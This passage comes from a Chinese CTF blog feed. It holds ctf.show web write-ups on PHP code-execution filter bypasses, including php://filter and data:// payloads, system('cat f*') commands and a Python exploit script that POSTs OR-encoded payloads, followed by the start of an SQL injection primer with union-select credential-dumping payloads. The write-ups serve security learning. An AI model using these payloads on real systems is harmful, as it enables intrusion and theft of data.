function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次连分号和括号都过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><img src="/images/ctf-web06/image-20220924162859817.png" alt="image-20220924162859817" style="zoom:67%;" /><p>首先因为c的内容会在后边的代码中被执行, 那么使用<code>include</code> 将变量<code>GET[a]</code>包含进去,这里后边本应有个分号,但分号被过滤了,所以使用<code>?&gt;</code>相当于<strong>提前对php代码进行闭合</strong></p><p><strong><code>&amp;</code>在url中的作用是分割不同的GET变量</strong></p><p>上面的代码只会对变量c的值进行过滤,而不会检查这里包含进去的变量a的值, 所以在a中使用<code>php伪协议</code>来将<code>flag.php</code>的代码用<code>base64</code>编码的形式输出, 再将其解码就能看到flag了</p><br><hr><br><h1 id="Web33-36"><a href="#Web33-36" class="headerlink" title="Web33-36"></a>Web33-36</h1><p>接下来四道题都是在32的基础上继续增加过滤的关键词,但都能够使用32题的方法解决~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h1><img src="/images/ctf-web06/image-20220924163101782.png" alt="image-20220924163101782" style="zoom:67%;" /><p>这次没有 <code>eval</code>了, 因此c的内容不能再被当作代码执行了</p><p>而c被<code>include</code>函数包含了，因此考虑通过c来执行<code>php伪协议</code>命令</p><p>使用<code>data://</code>协议可以执行php代码</p><ul><li><p><code>data://text/plain,&lt;?php 被执行的代码;</code></p></li><li><p><code>data://text/plain;base64, 被执行代码的base64编码</code>（包含<?php和?>）</p></li></ul><img src="/images/ctf-web06/image-20220924163532005.png" alt="image-20220924163532005" style="zoom:67%;" /><br><hr><br><h1 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h1><img src="/images/ctf-web06/image-20220924163606046.png" alt="image-20220924163606046" style="zoom:67%;" /><p>过滤了关键词php, 因此在上一题的基础上, 使用base64对要执行的php代码进行编码就可以绕过过滤了</p><img src="/images/ctf-web06/image-20220924163707058.png" alt="image-20220924163707058" style="zoom:67%;" /><p>上图中的编码解码后为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行完这一句,在执行编码后的这一句即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat f*.php&gt;&gt;1.txt&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><hr><br><h1 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h1><img src="/images/ctf-web06/image-20220924164006560.png" alt="image-20220924164006560" style="zoom:67%;" /><p>在37题的基础上, <code>include</code>中, 变量c后面加了<code>.php</code>后缀</p><p>那么这里可以在<code>data://</code>伪协议中要执行的<code>php</code>代码后面加上<code>?&gt;</code>闭合它, 由此,payload为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:text/plain,&lt;?php system(&#x27;cat f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>这里就相当于执行了<code>&lt;?php system(&#39;cat f*&#39;)?&gt;.php</code> 因为语句已经提前闭合了, 所以后面的<code>.php</code>后缀并没有什么用</p><br><hr><br><h1 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h1><p><img src="/images/ctf-web06/image-20220924170359956.png" alt="image-20220924170359956"></p><p>过滤了很多符号, php伪协议应该是用不了了</p><p>上边过滤的是中文括号，所以英文括号应该是可以用的</p><blockquote><p>这里使用无参数的<code>RCE(remote command/code execute)</code></p><p>也就是可以执行<code>a()、a(b())或a(b(c()))</code>，但不能是<code>a(&#39;b&#39;)</code>或<code>a(&#39;b&#39;,&#39;c&#39;)</code>，不能带参数,因为引号被过滤了</p></blockquote><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE</a></p><p>那么本题需要使用无参数, 且能够返回一定的字符的函数来构造最终的payload</p><ul><li><p><code>Localeconv()</code>返回一包含本地数字及货币格式信息的<strong>数组</strong>，其中第一个元素是<code> .</code></p></li><li><p><code>current()</code>返回数组中的单元，默认是第一个，<code>pos()</code>与<code>current()</code>作用相同</p><p>那么, <code>current(localeconv())</code>返回的就是<code>.</code></p></li><li><p><code>scandir()</code>扫描一个目录,将目录里的文件以数组的形式返回</p><p>那么<code> scandir(current(localeconv()))</code>就相当于 <code>scandir(.)</code>作用为扫描当前目录</p></li><li><p><code>print_r</code>打印</p></li></ul><p>​<code>Print_r(scandir(current(localeconv())))</code>作用就是打印当前目录下的内容</p><ul><li><code>getcwd()</code>获取当前的绝对路径</li></ul><p>  那么<code>Print_r(scandir(getcwd()))</code>就是扫描当前目录并输出结果</p><ul><li><p><code> show_source()</code>显示源码</p></li><li><p>数组操作:</p><ul><li><code>each()</code>返回当前键、值，并将指针向后移动一步</li><li><code>end()</code>指针指向最后一个单元</li><li><code>next()</code>指针后移一步</li><li><code>prev()</code>指针前移一步</li><li><code>array_reverse()</code>用相反的元素顺序返回数组</li></ul></li></ul><p>先查看当前目录下都有哪些文件:</p><img src="/images/ctf-web06/image-20220924171411445.png" alt="image-20220924171411445" style="zoom:67%;" /><p>逆序输出文件名数组:</p><img src="/images/ctf-web06/image-20220924171750132.png" alt="image-20220924171750132" style="zoom:67%;" /><p>将数组指针指向下一个元素, 也就是<code>flag.php</code>使用 <code>showsource()</code>输出它的源码</p><p><img src="/images/ctf-web06/image-20220924171800583.png" alt="image-20220924171800583"></p><br><hr><br><h1 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h1><p><img src="/images/ctf-web06/image-20220924172602630.png" alt="image-20220924172602630"></p><p>这题连字母都过滤了</p><p>通过脚本来完成, 首先通过一个php脚本生成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$my_file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;  <span class="comment"># 把题目里的过滤条件放在这里</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>; <span class="comment"># 检查上面生成的十六进制数在转二进制后(hex2bin)能否被题目中给的过滤条件匹配到</span></span><br><span class="line">    &#125; </span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>; <span class="comment"># 如果没有被匹配到, 则在它们前面加上%,处理成url编码的格式</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>)); </span><br><span class="line">            <span class="comment"># a和b url解码后在二进制下进行或运算,得到的结果是c这个字符</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$my_file</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$my_file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码生成一个这样的文件:  后面两个url编码后的字符(这些字符不会被题目中的过滤条件过滤)在经过或运算之后能够得到前面的字符,</p><p>那么接下来就可以通过两个字符进行或运算的方式来构造最终希望执行的命令代码</p><img src="/images/ctf-web06/image-20220925203512064.png" alt="image-20220925203512064" style="zoom:67%;" /><p>构造命令并发送通过python脚本来完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># os.system(&quot;php rce_or.php&quot;)  # 没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(argv) != <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url = argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg: <span class="comment"># 这里的arg就是我们需要执行的命令,及这个命令的参数, 例如show_source(flag.php)</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i: <span class="comment"># 对于arg中的每个字符, 取出能够通过运算得到它的两个编码</span></span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span> </span><br><span class="line">    <span class="comment"># 得到的结果是第一个编码组成的串和第二个编码组成的串的或运算结果, 注意中间那个&quot;|&quot;是进行或运算的意思</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(param) <span class="comment"># 解码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(param+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>程序运行结果如下图, 可以看到flag已经在响应包里了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">D:\python learning\ctf&gt;py web41.py http://080c3454-e571-44f6-80db-b2aac9c9e04e.challenge.ctf.show/</span><br><span class="line"></span><br><span class="line">[+] your function：show_source</span><br><span class="line">[+] your command：flag.php</span><br><span class="line"></span><br><span class="line">下面这两行是 param的内容, 对应位置的字符进行或运算可以分别得到 show_source 和 flag.php</span><br><span class="line">(&quot;%13%08%0f%17%00%13%0f%15%12%03%05&quot;|&quot;%60%60%60%60%5f%60%60%60%60%60%60&quot;)  (&quot;%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%60%2e%60%60%60&quot;)</span><br><span class="line">下面是最后准备POST的参数c的内容</span><br><span class="line">&#123;&#x27;c&#x27;: &#x27;(&quot;\x13\x08\x0f\x17\x00\x13\x0f\x15\x12\x03\x05&quot;|&quot;````_``````&quot;)(&quot;\x06\x0c\x01\x07\x00\x10\x08\x10&quot;|&quot;````.```&quot;)&#x27;&#125;</span><br><span class="line"></span><br><span class="line">[*] result:</span><br><span class="line">&lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$flag&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&lt;br /&gt;&lt;/span&gt;8161-85c6-4f0d-86b7-d83330fadd27&#125;&quot;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;1</span><br></pre></td></tr></table></figure><p>在上述python脚本中,<code> param</code>中字符原本为url编码的格式,也就是<code>%xx</code>格式, 它们解码后的字符都不在题目的过滤范围之内</p><p>35行需要对这些字符进行解码是因为它们在发送时还会被url编码, 这里的解码和后面发送时的自动编码是成对的. 抓包也能证明这一点</p><img src="/images/ctf-web06/image-20220925210440486.png" alt="image-20220925210440486" style="zoom:67%;" /><p>所以当这个包到达目标服务器时,按照正常流程还应该进行url解码, 所以题目给的脚本检测的实际上正是<code>param</code>的形式,因此也就绕过了过滤. </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入基础</title>
      <link href="/post/94662ad7.html"/>
      <url>/post/94662ad7.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念（待完善）"><a href="#基本概念（待完善）" class="headerlink" title="基本概念（待完善）"></a>基本概念（待完善）</h1><blockquote><p>通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p><p>是发生于应用程序与数据库层的安全漏洞。网站内部直接发送的SQL请求一般不会有危险，但实际情况是很<br>多时候需要<strong>结合用户的输入数据动态构造SQL语句</strong>，如果用户输入的数据被构造成恶意SQL代码，Web应用又<br>未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。</p></blockquote><p>在前后段分离的服务器架构中, SQL注入发生在后端服务器和数据库服务器交互的阶段</p><p>只要后端提供了一个接收用户输入的接口, 例如 <code>http://XXXXX.com/login.php</code>, 就有可能实现SQL注入, 前端不是必要的</p><p>最简单的SQL注入情况例如:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 正常情况下,后端接收用户输入并构造的sql语句:</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1 <span class="keyword">where</span> name <span class="operator">=</span> <span class="operator">%</span>s;</span><br><span class="line"><span class="comment">-- 这里%s存放的是用户输入并通过POST传过来的数据</span></span><br><span class="line"><span class="comment">-- 如果用户输入一个正常的数据,例如 Michael, 那么构造成的语句即为:</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1 <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;Michael&#x27;</span>;</span><br><span class="line"><span class="comment">-- 那么如果用户输入: xxx&#x27; or 1=1 --</span></span><br><span class="line"><span class="comment">-- 构造后的语句就成了: </span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1 <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;XXX&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--&#x27;;</span></span><br><span class="line"><span class="comment">-- 这里, xxx是一个胡乱输入的数据, 后面的单引号用来闭合变量左边本来就有的那个单引号, 而原本和它配对的单引号在最后被--注释掉了, 后面or 1=1 是一个必然成立的条件, where 后面的命题必然为真, 所以这里实际上就执行了&quot;select * from t1&quot;</span></span><br></pre></td></tr></table></figure><p>寻找注入点时最简单的情况, 在输入框中输入一个单引号<code>&#39;</code> , 如果网站会报SQL语法错误(可以通过F12在网站的响应包里查看), 那么基本上一定存在注入漏洞(<strong>说明网站没有对用户输入内容的过滤</strong>), 原因是:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 假设拼接的语句为</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"># 如果网站对用户的输入没有过滤的话, 不论输入什么, 都能够被拼接上面到xxx的位置, 一个单引号也不例外</span><br><span class="line"># 那么用户输入单引号, 拼接后就是:</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 这个语句被数据库服务器执行时遇到了三个单引号,当然会出现语法错误</span></span><br></pre></td></tr></table></figure><br><img src="/images/ctf-web03/image-20220924083225942.png" alt="image-20220924083225942" style="zoom:67%;" /><p>上图也是同样的道理, 攻击者输入的语句里, 先使用一个单引号闭合原本包裹变量的左侧单引号, 将右侧单引号使用<code>--</code>注释掉, 然后使用<code>UNION</code>附加了一个自己的查询, 输出了user表中所有的用户名和密码</p><p>再如:</p><img src="/images/ctf-web03/image-20220924083534234.png" alt="image-20220924083534234" style="zoom:67%;" /><p>闭合了前面的引号后, 加入了一个<code>update</code>语句, 更新了名为<code>administrator</code>的用户的密码值</p><p>常用操作:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;闭合语句里本来就有的单引号</span><br><span class="line">--或者# 注释掉不想让其起作用的语句</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="常见方法（待完善）"><a href="#常见方法（待完善）" class="headerlink" title="常见方法（待完善）"></a>常见方法（待完善）</h1><h2 id="最基本的"><a href="#最基本的" class="headerlink" title="最基本的"></a>最基本的</h2><ul><li><p><code>xxx&#39; or 1=1 ---</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1 <span class="keyword">where</span> name <span class="operator">=</span> <span class="operator">%</span>s;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1 <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;XXX&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--&#x27;;</span></span><br></pre></td></tr></table></figure></li><li><p><code>union</code>附加其他查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 原语句</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="string">&#x27;].&quot;&#x27;</span> limit <span class="number">1</span>;</span><br><span class="line"># 输入: <span class="number">1</span><span class="string">&#x27;union select database(),version(),user()--+</span></span><br></pre></td></tr></table></figure></li><li><p>语句之间使用分号分割执行多条语句,堆叠注入</p></li></ul><br><hr><br><h2 id="关于Information-schema数据库"><a href="#关于Information-schema数据库" class="headerlink" title="关于Information_schema数据库"></a>关于Information_schema数据库</h2><blockquote><p><code>INFORMATION_SCHEMA</code>提供了对数据库元数据的访问，<strong>MySQL服务器信息，如数据库或表的名称，列的数据类型，访问权限</strong>等。 有时也把这些信息叫做数据字典或系统目录。</p><p><strong>每个数据库实例都会有一个 <code>INFORMATION_SCHEMA</code> 库</strong>，保存的是本实例下其他所有库的信息。<code>INFORMATION_SCHEMA</code>数据库包含多个只读表。 它们实际上是视图，而不是基础表，所以没有与它们关联的文件，并且你不能在它们上设置触发器。此外，数据库目录下也没有该库的目录。</p><p>虽然可以使用USE语句将<code>INFORMATION_SCHEMA</code>选择为缺省数据库，但只能读取表的内容，不能对它们执行<code>INSERT</code>，<code>UPDATE</code>或<code>DELETE</code>操作。</p><p>每个MySQL用户都可以访问 <code>INFORMATION_SCHEMA</code>，但是只能看到自己有权限的那些行。</p></blockquote><p>其中:</p><ul><li><code>TABLES</code>表记录了所有数据库中所有表的信息,<strong>例如表名,以及它属于哪一个数据库</strong></li></ul><p><img src="/images/ctf-web03/image-20221003164106895.png" alt="image-20221003164106895"></p><ul><li><p><code>COLUMNS</code>表记录了所有数据库中所有列的信息,<strong>例如列名, 它属于哪个表,属于哪个数据库</strong>..</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME <span class="keyword">from</span> COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/ctf-web03/image-20221003164853475.png" alt="image-20221003164853475"></p></li></ul><h1 id="姿势汇总"><a href="#姿势汇总" class="headerlink" title="姿势汇总"></a>姿势汇总</h1><ul><li><p>没有限制的话,使用分号做间隔,可以执行多条语句(<strong>堆叠注入</strong>)</p></li><li><p><code>fuzz</code>测试: </p><p>对于存在关键词过滤的,可以通过Burpsuite的<code>Intruder</code>功能来测试哪些字符或者语句可以使用</p><p>简要流程:</p><ol><li><p>提交一次常规查询并抓包,转到<code>Intruder</code>模块,找找查询关键词的位置,以此设置攻击点:</p><p><img src="/images/ctf-web03/image-20221013193439637.png" alt="image-20221013193439637"></p></li><li><p>加载字典和其他设置,线程数不要太高,否则容易报429错误</p></li><li><p>开始攻击,并根据响应包的长度来判断哪些字符或语句被过滤了.</p></li></ol></li></ul><br><h2 id="常规有回显"><a href="#常规有回显" class="headerlink" title="常规有回显"></a>常规有回显</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1 </span><br></pre></td></tr></table></figure><p><code>#</code>和<code>--</code>都能够起到注释作用,用来让后面的语句失效</p><br><h3 id="union-select"><a href="#union-select" class="headerlink" title="union select:"></a><strong>union select</strong>:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; union select version(),database(),user() #</span><br><span class="line">//查询某个数据库中的所有表,这里的1或者其他任意字符起到占位作用,因为原查询结果有两列,如果原查询结果更多,这里也要添加更多占位字符:</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; union select group_concat(TABLE_NAME),1 from information_schema.TABLES where table_schema=&#x27;库名&#x27;# </span><br><span class="line">//查询某个库中某个表的所有列名:</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; union select group_concat(COLUMN_NAME),2 from information_schema.COLUMNS where table_schema=&#x27;库名&#x27; and table_name=&#x27;表名&#x27;#</span><br><span class="line">//查询具体数据:</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; union select user,password from users#</span><br></pre></td></tr></table></figure><br><h3 id="information-schema被过滤时-有时候被or过滤误伤"><a 